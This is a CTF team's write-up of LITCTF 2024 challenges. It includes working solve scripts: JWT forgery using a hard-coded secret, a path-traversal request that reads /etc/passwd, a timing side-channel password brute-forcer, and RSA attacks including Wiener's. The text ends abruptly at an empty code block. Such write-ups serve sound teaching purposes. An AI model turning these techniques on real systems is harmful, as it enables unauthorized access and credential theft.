---
title: "LITCTF"
description: "Migrated from Astro"
icon: "article"
date: "2024-08-13"
lastmod: "2024-08-13"
draft: false
toc: true
weight: 999
---

Hello `CTFers`, What a fantastic CTF it was! We had an amazing time over the weekend, and the excitement carried all the way into early Tuesday. We, H7Tex, secured 103rd place overall.

{{< figure src="1.png" alt="1" >}}

```
Authors: Abu, PattuSai, MrRobot, SHL
```

## Miscellaneous

### Welcome

Author: `bd7`

Please join the Discord for the latest announcements and read [the contest rules](https://lit.lhsmathcs.org/logistics)! Good luck!

Unlike some ridiculous Discord challenges, this was straight forward.

Here’s something random LOL.

{{< figure src="2.png" alt="p4" >}}

Flag: `LITCTF{we_4re_happy_1it2024_is_h4pp3n1ng_and_h0p3_u_r_2}`

P.S. This was me when I started out on CTFs HAHA.

{{< figure src="3.png" alt="p4" >}}

### **geoguessr1**

Authors: `bd7`, `Stephanie`

Where is this? Flag format: Use three decimal points of precision and round. The last digit of the first coordinate is ODD, and the last digit of the second coordinate is EVEN. Example: LITCTF{80.439,-23.498} (no spaces)

{{< figure src="10.png" alt="10" >}}

Diving head first into Google Lens, we find out that it’s around the Daxi Bridge.

{{< figure src="11.png" alt="11" >}}

Flag: `LITCTF{24.885,121.284}`

### **geoguessr2**

Authors: `bd7`, `Stephanie`

{{< figure src="12.png" alt="12" >}}

Our history class recently took a walk on a field trip here. Where is this? Flag format: Use three decimal points of precision and round. The last digit of the first coordinate is EVEN, and the last digit of the second coordinate is ODD. Example: LITCTF{80.438,-23.497} (no spaces)

Once again using our trusty Google Lens. It’s from the Lexington Battle Green Graveyard.

{{< figure src="13.png" alt="13" >}}

Flag: `LITCTF{42.450,-71.233}`

### **a little bit of tomcroppery**

Author: `bookworm`

Once you crop an image, the cropped part is gone... right???

{{< figure src="14.png" alt="p4" >}}

Interesting challenge, the description gives a hint as the image is a cropped one. Let’s find a way to un-crop it. After a bunch of using common tools like `exiftool` and `binwalk`, there seems to be a second PNG within the file.

```python
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/LITCTF/misc/tomcrop]
└─$ xxd image.png | grep -A 1 IEND
0006db60: 530d 48cc 0f75 0000 0000 4945 4e44 ae42  S.H..u....IEND.B
0006db70: 6082 8950 4e47 0d0a 1a0a 0000 000d 4948  ..PNG........IH
--
00129c60: 30c6 0d77 e800 0000 0049 454e 44ae 4260  0..w.....IEND.B
00129c70: 82
```

Here, you the IEND chunk of another PNG within the main file. Let’s extract it.

```python
dd if=image.png of=flag.bin bs=1 skip=449384 count=$((0x00129c60 - 0x0006db68))
```

{{< figure src="15.png" alt="p4" >}}

Flag: `LITCTF{4cr0p41yp5e_15_k1nd_0f_c001_j9g0s}`

### **endless**

Author: `halp`

Whoops! I deleted the file ending of this file, and now I can't seem to figure out what type of file it was. Can you help me?

Given: **`mystery-flag`**

This is a funny thing, the author intended for the challenge to fix the file signature, but Windows, just straight up revealed it was a `mp3` as soon as I downloaded it LOL. Just Windows things. Shout-out to `@SHL`.

{{< figure src="16.png" alt="p4" >}}

Then on I went to Audacity to make the audio a bit more clearer. Here’s the results.

<audio controls src="./mystery-flag-solved.mp3" title="Flag"></audio>

Woah, Notion actually renders MP3 audios in a nice way, let’s see if Jekyll and GitHub Pages do the same.

Flag: `LITCTF{f0udao4rtbsp6}`

### **pokemon**

Author: `Stephanie`

I love pokemon! Win to get the flag

Given: **`pokemon.zip`**

We’re given a zip file that contains a basic webpage with Pikachu and Charizard trying to fight each other, and if Pikachu wins, then we get a series of flag symbols at a fast pace, but we have all the images locally on the system.

{{< figure src="17.png" alt="17" >}}

I recognized this instantly as I’ve done this before, head on to `dCode` and open up `Flag Semaphore` decoder, from then on, just arrange the files in order to get the flag.

{{< figure src="18.png" alt="18" >}}

Flag: `LITCTF{POKEAAAG}`

### **Kuwahara**

Author: `Agniv`

Finally a good stego problem??

Given: **`kuwahara-png-problem.zip`**

A detailed write-up will be shared when the author feels like it.

## Web Exploitation

### **anti-inspect**

can you find the answer? **WARNING: do not open the link your computer will not enjoy it much.** URL: https://litctf.org:31779/ Hint: If your flag does not work, think about how to style the output of console.log
Author: `halp`

Please do not open this link on your browser, my machine slowed [flashback to `CrowdStrike`], had to restart it. 

{{< figure src="4.png" alt="p4" >}}

Just `curl` the link.

```bash
└─$ curl https://litctf.org:31779/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <script>
      const flag = "LITCTF{your_%cfOund_teh_fI@g_94932}";
      while (true)
        console.log(
          flag,
          "background-color: darkblue; color: white; font-style: italic; border: 5px solid hotpink; font-size: 2em;"
        );
    </script>
  </body>
</html>
```

Flag: `LITCTF{your_%cfOund_teh_fI@g_94932}`

### **jwt-1**

I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at https://litctf.org:31781/.
Author: `halp`

Oh JWT, these are feel-good ones.

{{< figure src="5.png" alt="p4" >}}

Go ahead and log yourself in, then either `CTRL+U` or inspect the page. Under Applications there would be a JWT[JSON Web Tokens] cookie generated.

{{< figure src="6.png" alt="6" >}}

<aside>
💡 JSON Web Token, is a compact, URL-safe token used for securely transmitting information between parties as a JSON object. It's commonly used for authentication and authorization

</aside>

So, you can go ahead and use [JWT.io](https://jwt.io/) to parse the cookie or use a CLI tool like `jwt-cli` . In order to run `jwt-cli` you would need Rust and Cargo, the Rust package manager. You can do that with

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

Restart your terminal then use `cargo` to install `jwt-cli`.

```bash
cargo install jwt-cli
```

https://github.com/mike-engel/jwt-cli

```bash
└─$ jwt decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWJ1IiwiYWRtaW4iOmZhbHNlfQ.1bQi6RMpHy%2Bi0tocoYNigBuVmhnBfHlie%2Bpp37oXF6k

Token header
------
{
  "typ": "JWT",
  "alg": "HS256"
}

Token claims
------
{
  "admin": false,
  "name": "abu"
}
```

We see that the admin parameter had been set to false, since we don’t require a key in order to change it’s contents. FYI.

A JWT typically has three parts:

1. **Header**: Contains metadata about the token, such as the signing algorithm.
2. **Payload**: Contains the claims or data, such as user information.
3. **Signature**: Verifies the token's authenticity and integrity.

You can change the admin parameters with this command. Any secret key works as the server doesn’t verify the key.

```bash
└─$ jwt encode --secret mysecretkey --alg HS256 -P "name=abu" -P "admin=true"
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNzIzNTI2MTQ0LCJuYW1lIjoiYWJ1In0.3WJQ0ZMEa74ilF5n6eXx0BQz-C4uenMi8ehCeI5--Hw
```

Then go ahead and change the cookie and press the `Get-Flag` to get the flag.

{{< figure src="7.png" alt="7" >}}

Flag: `LITCTF{o0ps_forg0r_To_v3rify_1re4DV9}`

### **jwt-2**

its like jwt-1 but this one is harder URL: https://litctf.org:31777/

Author: `halp`

Like given in the description it’s the next level of JWT this time. We’ve been given a `index.ts` file to inspect.

```bash
import express from "express";
import cookieParser from "cookie-parser";
import path from "path";
import fs from "fs";
import crypto from "crypto";

const app = express();

const accounts: [string, string][] = [];

const jwtSecret = "xook";
const jwtHeader = Buffer.from(
  JSON.stringify({ alg: "HS256", typ: "JWT" }),
  "utf-8"
)
  .toString("base64")
  .replace(/=/g, "");

const sign = (payload: object) => {
  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
    .toString("base64")
    .replace(/=/g, "");
  const signature = crypto.createHmac('sha256', jwtSecret)
    .update(jwtHeader + '.' + jwtPayload)
    .digest('base64')
    .replace(/=/g, '');
  return jwtHeader + "." + jwtPayload + "." + signature;
}

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, "site")));

app.get("/", (req, res) => {
  res.send("Welcome to the JWT challenge server!");
});

app.get("/flag", (req, res) => {
  if (!req.cookies.token) {
    console.log('no auth')
    return res.status(403).send("Unauthorized");
  }

  try {
    const token = req.cookies.token;
    // split up token
    const [header, payload, signature] = token.split(".");
    if (!header || !payload || !signature) {
      return res.status(403).send("Unauthorized");
    }
    Buffer.from(header, "base64").toString();
    // decode payload
    const decodedPayload = Buffer.from(payload, "base64").toString();
    // parse payload
    const parsedPayload = JSON.parse(decodedPayload);
    // verify signature
    const expectedSignature = crypto.createHmac('sha256', jwtSecret)
      .update(header + '.' + payload)
      .digest('base64')
      .replace(/=/g, '');
    if (signature !== expectedSignature) {
      return res.status(403).send('Unauthorized ;)');
    }
    // check if user is admin
    if (parsedPayload.admin || !("name" in parsedPayload)) {
      return res.send(
        fs.readFileSync(path.join(__dirname, "flag.txt"), "utf-8")
      );
    } else {
      return res.status(403).send("Unauthorized");
    }
  } catch {
    return res.status(403).send("Unauthorized");
  }
});

app.post("/login", (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).send("Bad Request");
    }
    if (
      accounts.find(
        (account) => account[0] === username && account[1] === password
      )
    ) {
      const token = sign({ name: username, admin: false });
      res.cookie("token", token);
      return res.redirect("/");
    } else {
      return res.status(403).send("Account not found");
    }
  } catch {
    return res.status(400).send("Bad Request");
  }
});

app.post('/signup', (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).send('Bad Request');
    }
    if (accounts.find(account => account[0] === username)) {
      return res.status(400).send('Bad Request');
    }
    accounts.push([username, password]);
    const token = sign({ name: username, admin: false });
    res.cookie('token', token);
    return res.redirect('/');
  } catch {
    return res.status(400).send('Bad Request');
  }
});

const port = process.env.PORT || 3000;

app.listen(port, () =>
  console.log("server up on https://localhost:" + port.toString())
);
```

The takeaways from this code include, getting the hard-coded secret key `xook` and also how the server verifies the cookies. And **`/flag`**: Protected route that serves a flag if the token is valid and contains an `admin` claim or if the `name` field is present.
Since, we know the secret key, encryption algorithm [HS256] and also the method by which the server verifies the cookies, we can go ahead and create a exploit to create an admin cookie.

Here, I used JavaScript as Python had some issues, plus it’s easier as most of the code is given in the `index.ts` file.

```bash
const crypto = require('crypto');

const jwtSecret = "xook";
const jwtHeader = Buffer.from(
  JSON.stringify({ alg: "HS256", typ: "JWT" }),
  "utf-8"
).toString("base64").replace(/=/g, "");

const payload = { name: "abu", admin: true };
const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
  .toString("base64")
  .replace(/=/g, "");

const signature = crypto.createHmac('sha256', jwtSecret)
  .update(jwtHeader + '.' + jwtPayload)
  .digest('base64')
  .replace(/=/g, '');

const token = `${jwtHeader}.${jwtPayload}.${signature}`;
console.log(token);
```

```bash
└─$ node solve.js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWJ1IiwiYWRtaW4iOnRydWV9.lP/6KBzWQ7oXP6AvKDBom0+cOQMDlgj9iVBGIohk9uE
```

Sending this back to the server, we get the flag.

Flag: `LITCTF{v3rifyed_thI3_Tlme_1re4DV9}`

### **traversed**

I made this website! you can't see anything else though... right?? URL: https://litctf.org:31778/

Author: `halp`

Going to the site, we see this message.

<aside>
💡 Welcome! The flag is hidden somewhere... Try seeing what you can do in the url bar. There isn't much on this page…

</aside>

From this it’s pretty clear that the challenge is LFI [Local File Inclusion]. And finding the `/etc/passwd` took no time, but got struck here for a while.

[File Inclusion/Path traversal | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

```bash
└─$ curl "https://litctf.org:31778/?file=../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

And after getting too focused on the URL part, I moved out and did a GET request to the `flag.txt` 

and out came the flag.

```bash
└─$ curl -X GET "https://litctf.org:31778/?file=../../../flag.txt"
LITCTF{backtr@ked_230fim0}
```

Flag: `LITCTF{backtr@ked_230fim0}`

### **kirbytime**

Welcome to Kirby's Website.

Author: `Stephanie`

Given: [**kirbytime.zip](https://drive.google.com/uc?export=download&id=186KLr52yoTD1scFyzeZKSMa6cUr9iV6m&name=kirbytime.zip) + Instance**

Unzipping the file, we get the following files.

```bash
login.html  main.py  static
```

`login.html` gives the login and password forms of the site.

`static/` is a directory containing image resources of the site.

Here’s `main.py` 

```python
import sqlite3
from flask import Flask, request, render_template
import time

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    message = None
    if request.method == 'POST':
        password = request.form['password']
        real = 'zExQWkq'  # This is the password that needs to be found + Testing !
        if len(password) != 7:
            return render_template('login.html', message="You need 7 chars")
        for i in range(len(password)):
            if password[i] != real[i]:
                message = "Incorrect"
                return render_template('login.html', message=message)
            else:
                time.sleep(1)
        if password == real:
            message = "Yayy! Hi Kirby!"

    return render_template('login.html', message=message)

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

Now, all this code does is that it checks each and every character of the `real` [original] with the user input password, and if a character is right then the server induces a delay of 1 second before verifying. So, if all the characters in the user-input password is correct the server delays the end result by 7 seconds as `time.sleep(7)` . Now, let’s hack Time !

{{< figure src="8.png" alt="p4" >}}

We are about to exploit the time delay vulnerability in the server code, here is my thinking, now first of all what are the character sets or the domain of characters that we are about to use in the script. We in the gray-area ourselves so, let’s go with `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ` , actually I used with numbers at first but moved on to without them. Now the idea is to induce a side-channel attack on the time vulnerability, at least this is what a guy on Discord said after the event, I didn’t know all that, so the idea is to, start of with an empty array of 7 `[#, #, #, #, #, #, #]` then iterate each character in the character with the POST request to the server, so the first set of iterations in the first loop would be [a, #, #, #, #, #, #] [b, #, #, #, #, #, #] [c, #, #, #, #, #, #] . Now important thing here would be to measure the response time of the server. Now that we’re testing the validity of the first character, whenever the response time of the server exceed 1 second, it is safe to assume that that character is correct and we move on to the next character iteration loop, so in the test password [`zExQWkq`] where `z` is the valid first character, we see in the output snippet below that the check of `z` comes after a delay of 1 second, and it is indeed the right character.

```python
Testing: y###### | Time taken: 0.00 seconds
Testing: z###### | Time taken: 1.01 seconds
Testing: A###### | Time taken: 0.01 seconds
```

Now, the loop updates the known list to append the right character at the start and moves on to iterate through the next character set.

```python
Updated password: z######
Finding character at position 2...
Testing: za##### | Time taken: 1.01 seconds
Testing: zb##### | Time taken: 1.01 seconds
```

And this continues until it goes through all the 7 character list to get the final password.

Basically brute-forcing each character and exploiting the time vulnerability.

Here is the code I used to solve the challenge locally.

```python
import requests
import time

url = 'https://localhost:5000'

length = 7
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

def generate(currentPassword, position):
    TPassword = []
    for char in charset:
        test_password = currentPassword[:position] + char + '#' * (length - position - 1)
        TPassword.append(test_password)
    return TPassword

def TPassword(TPassword):
    times = {}

    for password in TPassword:
        start_time = time.time()
        response = requests.post(url, data={'password': password})
        elapsed_time = time.time() - start_time

        print(f'Testing: {password} | Time taken: {elapsed_time:.2f} seconds')

        times[password] = elapsed_time

    correctPassword = max(times, key=times.get)
    return correctPassword

def main():
    currentPassword = '#' * length

    for position in range(length):
        print(f'Finding character at position {position + 1}...')

        TPassword_list = generate(currentPassword, position)

        while True:
            correctPassword = TPassword(TPassword_list)
            correctChar = correctPassword[position]

            if correctChar:
                currentPassword = currentPassword[:position] + correctChar + currentPassword[position + 1:]
                print(f'Updated password: {currentPassword}')
                break
            else:
                print('No correct character found')
                break

    print(f'Final password: {currentPassword}')

if __name__ == "__main__":
    main()

```

```python
Updated password: zExQWkq
Final password: zExQWkq
```

That took about 18 minutes that is too long to compensate for the given 10 minutes of instance time. During the CTF, @MrRobot solved the challenge [Shout-out to him], but since my code takes about 18 minutes to run, I found 5 valid characters in the first 10 minutes, then re-launched the instance to find the remaining two. I’ll try to improvise the code efficiency later. Here is a much efficient script that runs in right about 11 minutes, we find 6 characters here. It’s now a race against time LOL.

```python
import requests
import time

url = 'https://34.31.154.223:56366'

length = 7
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
margin = 0.2

def generate(currentPassword, position):
    TPassword = []
    for char in charset:
        testPassword = currentPassword[:position] + char + '#' * (length - position - 1)
        TPassword.append(testPassword)
    return TPassword

def TPassword(TPassword, CDelay):
    max_time = 0
    correctPassword = ''

    for password in TPassword:
        start_time = time.time()
        response = requests.post(url, data={'password': password})
        ETime = time.time() - start_time

        print(f'Testing: {password} | Time taken: {ETime:.2f} seconds')

        if ETime > max_time:
            max_time = ETime
            correctPassword = password

        if ETime > CDelay + margin:
            break

    return correctPassword, max_time

def main():
    currentPassword = '#' * length
    CDelay = 1

    for position in range(length):
        print(f'Finding character at position {position + 1}...')

        TPassword_list = generate(currentPassword, position)

        correctPassword, max_time = TPassword(TPassword_list, CDelay)
        correctChar = correctPassword[position]

        currentPassword = currentPassword[:position] + correctChar + currentPassword[position + 1:]
        print(f'Updated password: {currentPassword}')

        CDelay += 1

    print(f'Final password: {currentPassword}')

if __name__ == "__main__":
    main()

```

Flag: `LITCTF{kBySlaY}`

## Cryptography

### **simple otp**

We all know OTP is unbreakable...

Author: `Stephanie`

Given: `main.py`

```python
import random

encoded_with_xor = b'\x81Nx\x9b\xea)\xe4\x11\xc5 e\xbb\xcdR\xb7\x8f:\xf8\x8bJ\x15\x0e.n\\-/4\x91\xdcN\x8a'

random.seed(0)
key = random.randbytes(32)
```

The script first sets the random seed to 0 (`random.seed(0)`), ensuring that the key generated by `random.randbytes(32)` is always the same whenever the script is run. Therefore, we can can exploit that with a simple script that reverses the encryption.

```python
import random

cipher = b'\x81Nx\x9b\xea)\xe4\x11\xc5 e\xbb\xcdR\xb7\x8f:\xf8\x8bJ\x15\x0e.n\\-/4\x91\xdcN\x8a'

random.seed(0)
key = random.randbytes(32)

flag = bytes([x ^ y for x, y in zip(cipher, key)])

print(flag.decode('utf-8'))
```

Flag: `LITCTF{sillyOTPlol!!!!sdfsgvkhf}`

### **privatekey**

Author: `allu`

something's smaller

Given: `chal.txt`

```python
N = 91222155440553152389498614260050699731763350575147080767270489977917091931170943138928885120658877746247611632809405330094823541534217244038578699660880006339704989092479659053257803665271330929925869501196563443668981397902668090043639708667461870466802555861441754587186218972034248949207279990970777750209
e = 89367874380527493290104721678355794851752244712307964470391711606074727267038562743027846335233189217972523295913276633530423913558009009304519822798850828058341163149186400703842247356763254163467344158854476953789177826969005741218604103441014310747381924897883873667049874536894418991242502458035490144319
c = 71713040895862900826227958162735654909383845445237320223905265447935484166586100020297922365470898490364132661022898730819952219842679884422062319998678974747389086806470313146322055888525887658138813737156642494577963249790227961555514310838370972597205191372072037773173143170516757649991406773514836843206
```

We get an RSA challenge ! description says somethings small, so I would guess that the private exponent `d` is small due to the large size of the exponent `e`. We can then implement Wiener’s Attack on this problem. Running `RsaCtfTool` also works.

```python
[*] Performing wiener attack on /tmp/tmppn99ebrk.
  5%|███▉                                                                                  | 16/348 [00:00<00:00, 46122.93it/s]
[*] Attack success with wiener method !
[+] Total time elapsed min,max,avg: 0.0004/60.0114/4.9691 sec.

Results for /tmp/tmppn99ebrk:

Decrypted data :
HEX : 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c49544354467b7731336e33725f31355f346e5f756e66307274756e3474335f6e346d337d
INT (big endian) : 37939020230330854731943576651612505007374965780966694255744652554115478625589798116340605
INT (little endian) : 87919051403382667481964558983148140461234810916674675904094874152844076042378429193932883905777908929337833735348183711195155694593885399779605853182602927587024733382600753540408432112795735650920287838092108325932965050277471081309559705830853342912176110584557209615638279615498298359469103112495353036800
utf-8 : LITCTF{w13n3r_15_4n_unf0rtun4t3_n4m3}
utf-16 : 䰀呉呃筆ㅷ渳爳ㅟ張渴畟普爰畴㑮㍴湟洴紳
STR : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LITCTF{w13n3r_15_4n_unf0rtun4t3_n4m3}'
```

Check out the sage implementation of Wiener’s attack at 

[Wiener's Attack | CryptoBook](https://cryptohack.gitbook.io/cryptobook/untitled/low-private-component-attacks/wieners-attack)

```python
from Crypto.Util.number import long_to_bytes

def wiener(e, n):
    # Convert e/n into a continued fraction
    cf = continued_fraction(e/n)
    convergents = cf.convergents()
    for kd in convergents:
        k = kd.numerator()
        d = kd.denominator()
        # Check if k and d meet the requirements
        if k == 0 or d%2 == 0 or e*d % k != 1:
            continue
        phi = (e*d - 1)/k
        # Create the polynomial
        x = PolynomialRing(RationalField(), 'x').gen()
        f = x^2 - (n-phi+1)*x + n
        roots = f.roots()
        # Check if polynomial as two roots
        if len(roots) != 2:
            continue
        # Check if roots of the polynomial are p and q
        p,q = int(roots[0][0]), int(roots[1][0])
        if p*q == n:
            return d
    return None
# Test to see if our attack works
if __name__ == '__main__':
    n = 91222155440553152389498614260050699731763350575147080767270489977917091931170943138928885120658877746247611632809405330094823541534217244038578699660880006339704989092479659053257803665271330929925869501196563443668981397902668090043639708667461870466802555861441754587186218972034248949207279990970777750209
    e = 89367874380527493290104721678355794851752244712307964470391711606074727267038562743027846335233189217972523295913276633530423913558009009304519822798850828058341163149186400703842247356763254163467344158854476953789177826969005741218604103441014310747381924897883873667049874536894418991242502458035490144319
    c = 71713040895862900826227958162735654909383845445237320223905265447935484166586100020297922365470898490364132661022898730819952219842679884422062319998678974747389086806470313146322055888525887658138813737156642494577963249790227961555514310838370972597205191372072037773173143170516757649991406773514836843206

    d = wiener(e,n)
    assert not d is None, "Wiener's attack failed :("
    print(long_to_bytes(int(pow(c,d,n))).decode())
```

But before that I would urge my fellow cryptography enthusiasts to install `sage` locally in their environment through `conda`. You can do that by following the steps below.

Sage : 

[Installation Guide](https://doc.sagemath.org/html/en/installation/index.html)

```bash
curl -L -O "[https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-$(uname)-$(uname-m).sh](https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-$(uname)-$)"
bash Miniforge3-$(uname)-$(uname -m).sh
conda create -n sage sage python=3.11

conda activate Sage
sage <file>.sage
```

Then run your exploit with sage.

```bash
(sage) ┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/LITCTF/crypto/privateKey]
└─$ sage solve.sage
LITCTF{w13n3r_15_4n_unf0rtun4t3_n4m3}
```

Flag: `LITCTF{w13n3r_15_4n_unf0rtun4t3_n4m3}`

### **pope shuffle**

Author: `halp`

it's like caesar cipher but better. Encoded: ࠴࠱࠼ࠫ࠼࠮ࡣࡋࡍࠨ࡛ࡍ࡚ࡇ࡛ࠩࡔࡉࡌࡥ

This was an interesting challenge, at first I tried using the traditional tools like `dCode` to figure out the type of cipher this is. Well, that didn’t go so well, so going over to `CyberChef` , I knew in the back of my head that it has to be some sort of Unicode, that we would then reverse to get the flag, and the hunch was right. At first I used the Escape Unicode Characters.

Which gave us this sequence, 

```
\u0834 \u0831 \u083c \u082b \u083c \u082e \u0863 \u084b \u084d 
\u0828 \u085b \u084d \u085a \u0847 \u085b \u0829 \u0854 \u0849 
\u084c \u0865
```

So now I removed the `\u08` prefix as that was repeating and common.

Which gave us `34 31 3c 2b 3c 2e 63 4b 4d 28 5b 4d 5a 47 5b 29 54 49 4c 65` .

Then I brain-stormed my brain to find that converting to decimal should be the next step.

So I did. `52, 49, 60, 43, 60, 46, 99, 75, 77, 40, 91, 77, 90, 71, 91, 41, 84, 73, 76, 101`

Now, this is were the Caesar cipher kind off came into play, we had to substract 40 from the decimals before adding the 64 to match them according to the ASCII notation. At last convert the decimal to plain-text to get the flag.

```
# Escape Unicode Characters

\u0834 \u0831 \u083c \u082b \u083c \u082e \u0863 \u084b \u084d 
\u0828 \u085b \u084d \u085a \u0847 \u085b \u0829 \u0854 \u0849 
\u084c \u0865

# Remove \u08
34 31 3c 2b 3c 2e 63 4b 4d 28 5b 4d 5a 47 5b 29 54 49 4c 65

# Convert to decimal
52, 49, 60, 43, 60, 46, 99, 75, 77, 40, 91, 77, 90, 71, 91, 41, 84, 73, 76, 101

# Substract 40
12, 9, 20, 3, 20, 6, 59, 35, 37, 0, 51, 37, 50, 31, 51, 1, 44, 33, 36, 61

# Add 64
76, 73, 84, 67, 84, 70, 123, 99, 101, 64, 115, 101, 114, 95, 115, 65, 108, 97, 100, 125

# Plain - Text

Flag : LITCTF{ce@ser_sAlad}
```

Flag: `LITCTF{ce@ser_sAlad}`

### **Symmetric RSA**

Author: `w0152`

Who needs public keys? Connect at nc [litctf.org](https://litctf.org/) 31783.

Given: `chal.py`

```python
#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes as ltb, bytes_to_long as btl, getPrime

p = getPrime(1024)
q = getPrime(1024)

n = p*q

e = p

with open("flag.txt", "rb") as f:
	PT = btl(f.read())

CT = pow(PT, e, n)
print(f"{CT = }")

for _ in range(4):
	CT = pow(int(input("Plaintext: ")), e, n)
	print(f"{CT = }")
```

My teammate `@PattuSai` solved this one. Here is the script he provided, will do the explanation in a bit.

```python
CT = 6712568265916110639335563361332951076891201603774271471450740567256965627526719148083098223800596638682926123512360667035923061579123315164609666409439771092308811183027740845100935721193299938732921927572092918770636785021917067751391724766586614972246012692999209160620981745950753004037634977267474503478748885324208658153225204922068398267508922119443343220075404153974363889506845362394322197865293702002470239019658842593475069879155615784717063902852562825215222391047106820370083266752633750788473918132604757508535969944042114861792240674133683620349343182535085866431909882710404615706923135485549305439590
P1=2
CT1 = 15874131342292921528152282961604790326510300175174043649962863981515619173228970689207989835620197964577073231103927192319078479235060451942612280138296406838751991385390612338466288010158960150542842096049097365333043311409686674573262137825221841795544585382865783558118372947115355938939597601317622461827282972033327182082623088550002711731275953009163244340247915583208194631718640657670624188520107820336202089190925263503500828878747529917211283678718724664447586557192525290597794112708105887216603263051433707462409118832502098817745849000757340770668091440840147037022494303278501035245510896202180012362038
P2=4
CT2 = 12036486967582139033206967592955333145800758618589695757107661021408302190086354054222801663698755943156056406208208110299180961355419525168942702364433112500552881859276146837446092975378268460359076103825024964585263954210240093556441555485483212609538103489018245440363539914859549806766436064896841934489099216475866095499275601056818901206620305667555145871462049517451805423147687684540635075845706447232685703552646453045484755933168291441681147150248430404177784859703113567383291671065403569011130659326654039775575033466197566873931229834039651581255091036043415285161071919060767722006208057324365219125025
P3=3
CT3 = 3484731977923158606337121365895975131963952974209770036539494575604773100146801759118516063619091523069589683740714237349634300297354740341658953708560524603494231921023851329424471184496224715842491398619548530354954208932048038217441365769534192025010878972322748944303408187946903209913375673413263915064084588623686847178440069416285936588750282330843297717583979458412292229989961821427329332027915377674169955766628835980859117793966182791946427754675119756658570222658819472148635536460527980271062377692635460732933023615101693755842528073547131997430172484565827092276670322918325052920069225235169413139278
P4=9
CT4 = 7514171672034945217631866098302303833404905795729974065570513633060566763566895892590790119894142044656795785827395896145368413673211260130696164440433937604141323656435196058356523388506865470383162206573054618331481133087471320053310271870743193990671556846116781505178713401153647290343356325717813041859317201659943401867108053970881198033375896429622435320142074638417004464444755393303560986785247156829696817523663940953974603135029995321923919813644104146571937562436377726563880796632034306909366426794145636748551394113952942075574524338174968364393909904521992094110923020899175919044105372167812718809471
n=gcd(CT1**2 - CT2,CT3**2 - CT4)
p=gcd(CT1 - 2 , n)
q=n//p 
e=p
phi=(p-1)*(q-1)
d = inverse_mod(e, phi)
m= hex(pow(CT, d, n))[2:]
for i in range(0,len(m),2):
    a=m[i]+m[i+1]
    print(chr(int(a,16)),end="")
```

{{< figure src="9.png" alt="9" >}}

Flag: `LITCTF{ju57_u53_e=65537_00a144ca}`

## Reverse Engineering

### **forgotten message**

Author: `halp`

I made a cool program to show the flag, but i forgot to output it! Now that I lost the source, I can't seem to remember the flag. Can you help me find it?

Given: **`forgotten-message`**

```python
└─$ strings forgotten-message | grep LITCTF
LITCTF{y0u_found_Me_3932cc3}
```

Flag: `LITCTF{y0u_found_Me_3932cc3}`

### **kablewy**

Author: `halp`

**WARNING: your computer might go kablewy if you try to do this one...** URL: [https://litctf.org:31782/](https://litctf.org:31782/)

Like the warning says, do not try to open this on the browser. Instead `curl`.

```bash
